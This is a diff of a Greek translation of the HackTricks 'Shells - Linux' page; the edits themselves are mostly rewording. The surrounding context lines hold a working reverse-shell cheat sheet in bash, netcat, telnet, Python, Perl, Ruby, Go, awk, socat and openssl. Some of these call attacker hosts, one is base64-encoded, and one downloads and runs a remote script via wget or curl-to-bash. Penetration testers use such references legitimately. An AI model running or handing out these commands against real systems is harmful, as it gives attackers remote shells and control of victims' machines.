@@ -1,24 +1,24 @@
-# Shells - Linux
+# Κέλυφη - Linux
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>
 
 Άλλοι τρόποι υποστήριξης του HackTricks:
 
 * Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του GitHub.
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) **και** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **αποθετήρια του github.**
 
 </details>
 
-**Αν έχετε ερωτήσεις σχετικά με οποιοδήποτε από αυτά τα shells μπορείτε να τα ελέγξετε με** [**https://explainshell.com/**](https://explainshell.com)
+**Αν έχετε ερωτήσεις σχετικά με οποιοδήποτε από αυτά τα κελύφη, μπορείτε να τα ελέγξετε με το** [**https://explainshell.com/**](https://explainshell.com)
 
-## Full TTY
+## Πλήρες TTY
 
-**Μόλις αποκτήσετε ένα αντίστροφο shell**[ **διαβάστε αυτήν τη σελίδα για να αποκτήσετε ένα πλήρες TTY**](full-ttys.md)**.**
+**Μόλις αποκτήσετε ένα αντίστροφο κέλυφος**[ **διαβάστε αυτήν τη σελίδα για να αποκτήσετε ένα πλήρες TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -35,7 +35,7 @@ exec >&0
 ```
 ### Ασφαλής κέλυφος συμβόλων
 
-Μην ξεχνάτε να ελέγχετε και με άλλα κέλυφα: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh και bash.
+Μην ξεχνάτε να ελέγχετε και με άλλα κελύφη: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh και bash.
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -46,10 +46,10 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Εξήγηση Shell
 
-1. **`bash -i`**: Αυτό το τμήμα της εντολής ξεκινάει ένα διαδραστικό (`-i`) κέλυφος Bash.
-2. **`>&`**: Αυτό το τμήμα της εντολής είναι μια συντόμευση για την **ανακατεύθυνση τόσο της τυπικής εξόδου** (`stdout`) όσο και της **τυπικής σφάλματος** (`stderr`) προς το **ίδιο προορισμό**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Αυτό είναι ένα ειδικό αρχείο που **αντιπροσωπεύει μια σύνδεση TCP στη συγκεκριμένη διεύθυνση IP και θύρα**.
-* Με το **ανακατεύθυνση των ροών εξόδου και σφάλματος σε αυτό το αρχείο**, η εντολή στέλνει αποτελέσματα της διαδραστικής συνεδρίας κελύφους στον υπολογιστή του εισβολέα.
+1. **`bash -i`**: Αυτό το τμήμα της εντολής ξεκινά ένα διαδραστικό (`-i`) κέλυφος Bash.
+2. **`>&`**: Αυτό το τμήμα της εντολής είναι μια συντομογραφία για την **ανακατεύθυνση τόσο της τυπικής εξόδου** (`stdout`) και της **τυπικής σφάλματος** (`stderr`) προς το **ίδιο προορισμό**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Αυτό είναι ένα ειδικό αρχείο που **αντιπροσωπεύει μια σύνδεση TCP στην καθορισμένη διεύθυνση IP και θύρα**.
+* Με το **ανακατεύθυνση των ροών εξόδου και σφάλματος σε αυτό το αρχείο**, η εντολή στέλνει αποτελέσματα της διαδραστικής συνεδρίας κελύφους στη μηχανή του εισβολέα.
 4. **`0>&1`**: Αυτό το τμήμα της εντολής **ανακατευθύνει την τυπική είσοδο (`stdin`) στον ίδιο προορισμό με την τυπική έξοδο (`stdout`)**.
 
 ### Δημιουργία σε αρχείο και εκτέλεση
@@ -59,17 +59,17 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Προωθούμενη κέλυφος
 
-Εάν αντιμετωπίσετε μια **ευπάθεια RCE** σε μια εφαρμογή ιστού βασισμένη σε Linux, ενδέχεται να υπάρχουν περιπτώσεις όπου **η απόκτηση εναντίον κέλυφους γίνεται δύσκολη** λόγω της ύπαρξης κανόνων Iptables ή άλλων φίλτρων. Σε τέτοια σενάρια, σκεφτείτε τη δημιουργία ενός κελύφους PTY εντός του χειρισμένου συστήματος χρησιμοποιώντας σωλήνες.
+Εάν αντιμετωπίσετε μια **ευπάθεια RCE** σε μια εφαρμογή ιστού βασισμένη σε Linux, ενδέχεται να υπάρχουν περιπτώσεις όπου **η απόκτηση εναντίον κέλυφους γίνεται δύσκολη** λόγω της ύπαρξης κανόνων Iptables ή άλλων φίλτρων. Σε τέτοια σενάρια, σκεφτείτε τη δημιουργία ενός PTY shell εντός του συστήματος που έχει διαρρεύσει χρησιμοποιώντας αγωγούς.
 
 Μπορείτε να βρείτε τον κώδικα στο [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
 Απλά χρειάζεται να τροποποιήσετε:
 
-* Τη διεύθυνση URL του ευάθροτου κόμβου
+* Τη διεύθυνση URL του ευάθειας συστήματος
 * Το πρόθεμα και το επίθεμα της φορτίου σας (αν υπάρχει)
 * Τον τρόπο με τον οποίο το φορτίο στέλνεται (κεφαλίδες; δεδομένα; επιπλέον πληροφορίες;)
 
-Έπειτα, μπορείτε απλά να **στείλετε εντολές** ή ακόμα και να **χρησιμοποιήσετε την εντολή `upgrade`** για να λάβετε ένα πλήρες PTY (σημειώστε ότι οι σωλήνες διαβάζονται και γράφονται με καθυστέρηση περίπου 1,3 δευτερολέπτων).
+Έπειτα, μπορείτε απλά να **στείλετε εντολές** ή ακόμα και να **χρησιμοποιήσετε την εντολή `upgrade`** για να λάβετε ένα πλήρες PTY (σημειώστε ότι οι αγωγοί διαβάζονται και γράφονται με καθυστέρηση περίπου 1,3 δευτερολέπτων).
 
 ## Netcat
 ```bash
@@ -87,7 +87,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet είναι ένα πρωτόκολλο δικτύου που σας επιτρέπει να συνδεθείτε σε άλλους υπολογιστές στο διαδίκτυο.
+Telnet είναι ένα πρωτόκολλο δικτύου που σας επιτρέπει να συνδεθείτε σε άλλες συσκευές στο δίκτυο.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -100,11 +100,9 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-```
 Για να στείλετε την εντολή, γράψτε την, πατήστε enter και πατήστε CTRL+D (για να σταματήσετε το STDIN)
 
 **Θύμα**
-```
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
@@ -117,13 +115,13 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 ```
 ## Perl
+
+Το Perl είναι ένα ισχυρό εργαλείο που χρησιμοποιείται ευρέως για την αυτοματοποίηση διαδικασιών και την επεξεργασία κειμένου. Ως shell, μπορεί να χρησιμοποιηθεί για να εκτελέσει εντολές στο σύστημα, να διαχειριστεί αρχεία και να προγραμματίσει εργασίες.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
-
-Το Ruby είναι μια δημοφιλής γλώσσα προγραμματισμού που χρησιμοποιείται ευρέως για την ανάπτυξη λογισμικού.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -151,14 +149,6 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Βρείτε ευπάθειες που έχουν μεγαλύτερη σημασία ώστε να μπορέσετε να τις επιδιορθώσετε γρηγορότερα. Το Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές σάρωσεις, εντοπίζει προβλήματα σε ολόκληρη την τεχνική σας υποδομή, από APIs έως web εφαρμογές και συστήματα cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks) σήμερα.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Golang
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
@@ -233,7 +223,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Δέσιμο κέλυφους
+### Bind shell
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
@@ -249,7 +239,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```
 ## Δάχτυλο
 
-**Επιτιθέμενος**
+**Εισβολέας**
 ```bash
 while true; do nc -l 79; done
 ```
@@ -265,7 +255,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 
 ### Εισαγωγή
 
-Το Gawk είναι μια ισχυρή γλώσσα προγραμματισμού για την επεξεργασία κειμένου και τη διαχείριση δεδομένων. Χρησιμοποιείται ευρέως στον κόσμο του Linux για την επεξεργασία και ανάλυση κειμένου αρχείων. Μπορεί να χρησιμοποιηθεί ως ένα ευέλικτο εργαλείο για τη δημιουργία σεναρίων επεξεργασίας δεδομένων.
+Το Gawk είναι μια ισχυρή γλώσσα προγραμματισμού για την επεξεργασία και ανάλυση κειμένου. Χρησιμοποιείται συχνά στον κόσμο του Linux για τη διαχείριση αρχείων κειμένου και την εξαγωγή δεδομένων. Το Gawk προσφέρει πληθώρα ενσωματωμένων λειτουργιών για την επεξεργασία κειμένου, καθιστώντας το ένα ισχυρό εργαλείο για τους χρήστες Linux.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -326,7 +316,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
 
 </details>
